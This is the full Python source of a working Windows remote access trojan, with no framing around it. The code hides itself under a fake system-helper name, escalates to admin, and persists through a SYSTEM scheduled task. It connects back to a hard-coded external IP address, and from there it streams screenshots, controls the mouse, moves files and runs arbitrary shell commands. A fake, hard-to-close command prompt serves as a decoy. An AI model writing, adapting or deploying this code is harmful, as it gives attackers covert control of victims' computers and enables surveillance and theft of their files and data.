import socket
import subprocess
import threading
import os
import sys
import time
import ctypes
import shutil
from PIL import ImageGrab
import pyautogui
import io
import keyboard
import tkinter as tk
from tkinter import scrolledtext

# =============== CONFIG ===============
SERVER_HOST = '152.53.182.180'
SERVER_PORT = 4444
TASK_NAME = "WindowsSystemHelper"
APP_NAME = "WindowsSystemHelper.exe"
# =====================================

viewing = False

# ================== SELF HIDING & PROTECTION ==================
def hide_itself():
    """Copy to hidden location and set attributes"""
    try:
        if getattr(sys, 'frozen', False):
            current_path = sys.executable
        else:
            current_path = os.path.abspath(sys.argv[0])

        hidden_dir = os.path.join(os.getenv('APPDATA'), 'WindowsHelper')
        os.makedirs(hidden_dir, exist_ok=True)
        
        target_path = os.path.join(hidden_dir, APP_NAME)

        if current_path != target_path:
            shutil.copy2(current_path, target_path)
            
            # Hide file
            ctypes.windll.kernel32.SetFileAttributesW(target_path, 0x02 | 0x04)  # Hidden + System
            return target_path
        return current_path
    except:
        return None

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def request_admin():
    if is_admin(): return True
    try:
        if getattr(sys, 'frozen', False):
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, None, None, 1)
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{os.path.abspath(sys.argv[0])}"', None, 1)
        sys.exit(0)
    except:
        return False

def create_persistent_task(exe_path):
    if not is_admin(): return False
    try:
        os.system(f'schtasks /delete /tn {TASK_NAME} /f >nul 2>&1')
        cmd = f'schtasks /create /tn {TASK_NAME} /tr "{exe_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
        return os.system(cmd) == 0
    except:
        return False

def hide_console():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ================== FAKE TERMINAL (Isolated) ==================
def open_fake_terminal():
    def fake_command(event=None):
        cmd = entry.get().strip()
        if not cmd: return

        text_area.insert(tk.END, f"C:\\Users\\User> {cmd}\n", "input")

        # Completely fake responses - no real execution
        responses = {
            'whoami': 'victim-pc\\user',
            'systeminfo': 'OS: Windows 10 Pro\nRAM: 16GB\n',
            'dir': 'Desktop    Documents    Downloads    passwords.txt',
            'tasklist': 'System processes listed...',
            'netstat': 'Active connections shown...',
            'cls': '',
            'clear': '',
        }

        response = responses.get(cmd.lower(), 'Command completed successfully.')
        if response:
            text_area.insert(tk.END, response + "\n\n", "output")

        text_area.see(tk.END)
        entry.delete(0, tk.END)

    root = tk.Tk()
    root.title("Command Prompt")
    root.geometry("880x560")
    root.configure(bg='black')

    tk.Label(root, text="Microsoft Windows [Version 10.0.19045.1234]", bg='black', fg='white', font=("Consolas", 10)).pack(fill='x')
    
    text_area = scrolledtext.ScrolledText(root, bg='black', fg='#00ff00', font=("Consolas", 11))
    text_area.pack(fill='both', expand=True, padx=10, pady=5)
    text_area.tag_config("input", foreground="#00ff00")
    text_area.tag_config("output", foreground="#e0e0e0")

    text_area.insert(tk.END, "(c) Microsoft Corporation. All rights reserved.\n\n", "output")

    entry = tk.Entry(root, bg='black', fg='#00ff00', font=("Consolas", 11), insertbackground='white')
    entry.pack(fill='x', padx=10, pady=5)
    entry.bind("<Return>", fake_command)
    entry.focus()

    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Hard to close
    root.mainloop()

# ================== RAT FUNCTIONS ==================
def send_screenshot(client):
    global viewing
    while viewing:
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=60)
            data = buf.getvalue()
            client.send(len(data).to_bytes(4, 'big') + data)
            time.sleep(0.25)
        except:
            viewing = False
            break

def handle_commands(client):
    global viewing
    while True:
        try:
            cmd = client.recv(8192).decode('utf-8', errors='ignore').strip()
            if not cmd: continue

            if cmd.lower() == 'exit':
                viewing = False
                break

            elif cmd == 'view':
                viewing = True
                threading.Thread(target=send_screenshot, args=(client,), daemon=True).start()

            elif cmd == 'stopview':
                viewing = False

            elif cmd.startswith('mouse'):
                try:
                    _, action, x, y = cmd.split()
                    x, y = int(x), int(y)
                    if action == 'move': pyautogui.moveTo(x, y, duration=0.1)
                    elif action == 'click': pyautogui.click(x, y)
                    elif action == 'right': pyautogui.rightClick(x, y)
                except: pass

            elif cmd.startswith('download '):
                filepath = cmd.split(maxsplit=1)[1]
                try:
                    if os.path.exists(filepath):
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        client.send(len(data).to_bytes(8, 'big'))
                        client.send(data)
                        client.send(b'END')
                    else:
                        client.send(b'FILE_NOT_FOUND')
                except:
                    client.send(b'ERROR')

            elif cmd.startswith('upload '):
                filename = cmd.split(maxsplit=1)[1]
                try:
                    size_data = client.recv(8)
                    size = int.from_bytes(size_data, 'big')
                    with open(filename, 'wb') as f:
                        received = 0
                        while received < size:
                            chunk = client.recv(min(8192, size - received))
                            if not chunk: break
                            f.write(chunk)
                            received += len(chunk)
                    client.send(b'FILE_RECEIVED')
                except:
                    pass

            else:
                output = subprocess.getoutput(cmd)
                client.send((output or '[+] Done').encode('utf-8', errors='ignore'))

        except:
            break

def connect_to_vps():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_HOST, SERVER_PORT))
            threading.Thread(target=handle_commands, args=(client,), daemon=True).start()
            while True: time.sleep(10)
        except:
            time.sleep(8)

# ================== MAIN START ==================
if __name__ == "__main__":
    hide_console()
    
    if not is_admin():
        request_admin()

    # Hide and protect itself
    protected_path = hide_itself()
    if protected_path:
        create_persistent_task(protected_path)

    # Start fake terminal
    threading.Thread(target=open_fake_terminal, daemon=True).start()

    # Start real RAT
    threading.Thread(target=connect_to_vps, daemon=True).start()

    while True:
        time.sleep(10)
